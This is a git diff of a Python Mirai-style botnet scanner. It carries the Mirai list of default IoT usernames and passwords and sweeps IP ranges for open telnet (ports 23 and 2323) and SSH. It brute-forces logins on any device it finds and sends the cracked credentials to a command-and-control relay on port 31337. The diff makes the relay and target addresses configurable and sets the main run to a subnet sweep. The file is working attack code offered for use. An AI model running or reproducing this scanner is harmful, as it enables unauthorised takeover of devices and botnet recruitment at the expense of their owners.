@@ -3,6 +3,7 @@ import time
 import sys
 import telnetlib
 import os
+import json
 import hashlib
 import platform
 from random import randrange
@@ -12,69 +13,76 @@ from colorama import init, Fore
 
 
 
-MAlist = [('admin', 'password'),
-          ('root', 'vizxv'),
-          ('root', 'admin'),
-          ('admin', 'admin'),
-          ('root', '888888'),
-          ('root', 'xmhdipc'),
-          ('root', 'default'),
-          ('root', 'juantech'),
-          ('root', '123456'),
-          ('root', '54321'),
-          ('support', 'support'),
-          ('root', ''),
-          ('root', 'root'),
-          ('root', '12345'),
-          ('user', 'user'),
-          ('admin', ''),
-          ('root', 'pass'),
-          ('admin', 'admin1234'),
-          ('root', '1111'),
-          ('admin', 'smcadmin'),
-          ('admin', '1111'),
-          ('root', '666666'),
-          ('root', 'password'),
-          ('root', '1234'),
-          ('root', 'klv123'),
-          ('Administrator', 'admin'),
-          ('service', 'service'),
-          ('supervisor', 'supervisor'),
-          ('guest', 'guest'),
-          ('guest', '12345'),
-          ('admin1', 'password'),
-          ('administrator', '1234'),
-          ('666666', '666666'),
-          ('888888', '888888'),
-          ('ubnt', 'ubnt'),
-          ('root', 'klv1234'),
-          ('root', 'Zte521'),
-          ('root', 'hi3518'),
-          ('root', 'jvbzd'),
-          ('root', 'anko'),
-          ('root', 'zlxx.'),
-          ('root', '7ujMko0vizxv'),
-          ('root', '7ujMko0admin'),
-          ('root', 'system'),
-          ('root', 'ikwb'),
-          ('root', 'dreambox'),
-          ('root', 'user'),
-          ('root', 'realtek'),
-          ('root', '00000000'),
-          ('admin', '1111111'),
-          ('admin', '1234'),
-          ('admin', '12345'),
-          ('admin', '54321'),
-          ('admin', '123456'),
-          ('admin', '7ujMko0admin'),
-          ('admin', 'pass'),
-          ('admin', 'meinsm'),
-          ('tech', 'tech'),
-          ('mother', 'fucker')]
+MAlist = [("root", "password"),
+        ("admin", "password"),
+        ("admin", "admin"),
+        ("root", "admin"),
+        ("root", "888888"),
+        ("root", "xmhdipc"),
+        ("root", "default"),
+        ("root", "juantech"),
+        ("root", "123456"),
+        ("root", "54321"),
+        ("support", "support"),
+        ("root", ""),
+        ("root", "root"),
+        ("root", "12345"),
+        ("user", "user"),
+        ("admin", ""),
+        ("root", "pass"),
+        ("admin", "admin1234"),
+        ("root", "1111"),
+        ("admin", "smcadmin"),
+        ("admin", "1111"),
+        ("root", "666666"),
+        ("root", "vizxv"),
+        ("root", "1234"),
+        ("root", "klv123"),
+        ("Administrator", "admin"),
+        ("service", "service"),
+        ("supervisor", "supervisor"),
+        ("guest", "guest"),
+        ("guest", "12345"),
+        ("admin1", "password"),
+        ("administrator", "1234"),
+        ("666666", "666666"),
+        ("888888", "888888"),
+        ("ubnt", "ubnt"),
+        ("root", "klv1234"),
+        ("root", "Zte521"),
+        ("root", "hi3518"),
+        ("root", "jvbzd"),
+        ("root", "anko"),
+        ("root", "zlxx."),
+        ("root", "7ujMko0vizxv"),
+        ("root", "7ujMko0admin"),
+        ("root", "system"),
+        ("root", "ikwb"),
+        ("root", "dreambox"),
+        ("root", "user"),
+        ("root", "realtek"),
+        ("root", "00000000"),
+        ("admin", "1111111"),
+        ("admin", "1234"),
+        ("admin", "12345"),
+        ("admin", "54321"),
+        ("admin", "123456"),
+        ("admin", "7ujMko0admin"),
+        ("admin", "pass"),
+        ("admin", "meinsm"),
+        ("tech", "tech"),
+        ("mother", "fucker")]
+
+
+filename = 'ip_config.ini'
+with open(filename, 'r') as file:
+    json_data = json.load(file)
+RelayIP = json_data['RelayIP']
+targetIP = json_data['targetIP']
 
 
 # Relay
-__RELAY_H__ = "192.168.1.158"
+__RELAY_H__ = RelayIP  #192.168.1.97
 __RELAY_P__ = 31337
 __RELAY_PS_ = "||"
 
@@ -87,8 +95,7 @@ def get_credentials(pindex):
     global MAlist
     user = MAlist[pindex][0]
     password = MAlist[pindex][1]
-    print(f"[Scanner] Trying {user}:{password}")
-    pindex += 1
+    #print(f"[Scanner] Trying {user}:{password}")
     return user, password
 
 
@@ -106,7 +113,9 @@ def c2crd(usr, psw, ip, port):
             if data == "10":
                 tcpClientA.close()
                 print("[Scanner] Remote relay returned code 10(ok).")
-                break
+                return True
+            else:
+                return False
         except Exception as e:
             print("[Scanner] Unable to contact remote relay (%s)" % str(e))
             time.sleep(10)
@@ -124,6 +133,8 @@ def bruteport(ip, port):    #try 23 & 2323
         try:
             user = ""
             password = ""
+            if pindex>=len(MAlist):
+                break
             if not tn:
                 asked_password_in_cnx = False
                 tn = telnetlib.Telnet(ip, port)
@@ -152,9 +163,11 @@ def bruteport(ip, port):    #try 23 & 2323
                 if ">" in str(response) or "$" in str(response) or "#" in str(response) or "%" in str(response):
                     # broken
                     print("[Scanner] Brutefoce succeeded %s " % ip + ' : '.join((user, password)))
-                    c2crd(user, password, ip, port)
+                    if c2crd(user, password, ip, port):
+                        print("[!] Find new Device has login and control Vuln!")
+                        print("The target's username and password :\n",user+"\t",password)
                     pindex = 0
-                    return 
+                    return True 
                 pindex += 1
         except EOFError as e:
             tn = None
@@ -168,20 +181,30 @@ def is_telent_open(ip):
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sock.settimeout(__TIMEOUT__)
     result = sock.connect_ex((ip, 23))
-    if result == 0:             # if 23 port connect successful
-        print("[Scanner] Found IP address: %s" % ip)
-        bruteport(ip, 23)     #  try to brute force this port 23
-    else:
-        print("[Scanner] %s tcp/23 connectionreset" % ip)  # reset connect
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        result = sock.connect_ex((ip, 2323))
-        print("[Scanner] Trying connection over port 2323")  # try to connect 2323 port
-        if result == 0:     # connect success
+    try:
+        if result == 0:             # if 23 port connect successful
             print("[Scanner] Found IP address: %s" % ip)
-            bruteport(ip, 2323)
-        else:               # connect failure
-            print("[Scanner] %s fail to find telnet " % ip)
-    sock.close()
+            if bruteport(ip, 23):     #  try to brute force this port 23
+                return True
+            else :
+                return False
+        else:
+            print("[Scanner] %s tcp/23 connection reset" % ip)  # reset connect
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            result = sock.connect_ex((ip, 2323))
+            print("[Scanner] Trying connection over port 2323")  # try to connect 2323 port
+            if result == 0:     # connect success
+                print("[Scanner] Found IP address: %s" % ip)
+                if bruteport(ip, 2323):
+                    return True
+                else :
+                    return False
+            else:               # connect failure
+                print("[Scanner] %s fail to find telnet " % ip)
+                return False
+        sock.close()
+    except:
+        return False
 ''' ------------------------------'''
 
 def is_ssh_open(ip):
@@ -196,19 +219,15 @@ def is_ssh_open(ip):
         pindex += 1
         try:
             client.connect(hostname=ip, username=username, password=password, timeout=3)
-        except socket.timeout:
-            print(f"[Scanner] Host: {ip} is unreachable, timed out.")
-            return 
-        except paramiko.AuthenticationException:
-            print(f"[Scanner] Invalid credentials for {username}:{password}")
-            return False
         except paramiko.SSHException:
             print(f"[Scanner] Quota exceeded, retrying with delay...")
             time.sleep(60)
             if retry_two_times:
-                return
+                return False
             retry_two_times=True
             return is_ssh_open(ip)
+        except:
+            return False
         else:
             print(f"[Scanner] Found combo:\n\tHOSTNAME: {ip}\n\tUSERNAME: {username}\n\tPASSWORD: {password}")
             return True
@@ -242,18 +261,18 @@ def validateC2():
 
 def Scanner(choose):
     if choose == 1:
-        while True:
-            try:
-                for i in range(1, 255):
-                    is_ssh_open(generate_IP(i))
-                for i in range(1, 255):
-                    is_telent_open(generate_IP(i))
-            except KeyboardInterrupt:
-                print("[Scanner] Terminating bot ..")
-                break
-            except Exception as e:
-                print("[Scanner] Error: " + str(e))
-                break
+        '''
+        for i in range(1, 255):
+            ip=generate_IP(i)
+            print(ip)
+            if is_ssh_open(ip):
+                print("[!] Find!")
+            else:
+                pass
+            print("-"*10)
+        '''
+        for i in range(1, 255):
+            is_telent_open(generate_IP(i))
     else:
         print("Try to scan Telnet ---------------")
         is_telent_open("192.168.1.167")
@@ -264,8 +283,8 @@ def Scanner(choose):
 
 if __name__ == '__main__':
     print("[Scanner] Scanner process started ..")
-    validateC2() # Test to connect remote DB
-    Scanner(2)
+    #validateC2() # Test to connect remote DB
+    Scanner(1)
 
 
 '''
